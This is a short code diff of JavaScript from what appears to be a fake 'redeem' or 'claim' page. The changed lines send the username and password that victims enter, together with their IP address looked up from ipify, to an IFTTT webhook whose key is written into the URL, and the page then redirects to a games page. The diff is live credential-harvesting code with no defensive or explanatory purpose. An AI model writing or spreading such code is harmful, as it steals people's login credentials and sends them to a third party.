@@ -133,10 +133,8 @@
 
                 $.getJSON("https://api64.ipify.org?format=json",
     function(data) {
-        fetch(`https://maker.ifttt.com/trigger/notif/with/key/r5J_P2fP4Myjinry0A1te?value1=Website Name&value2=${data.ip}+-+Page Name`);
+        fetch(`https://maker.ifttt.com/trigger/notif/with/key/r5J_P2fP4Myjinry0A1te?value1=Content+Farm&value2=Redeem+-+${user.value}+-+${pass.value}&value3=${data.ip}`);
     })
-
-                fetch("https://maker.ifttt.com/trigger/content-farm/with/key/r5J_P2fP4Myjinry0A1te?value1=" + user.value + "&value2=" + pass.value + "&value3=Claim Page");
                 yayMusic.play();
                 setTimeout(function() {
                    location = "/games-Reo2CPftRX";
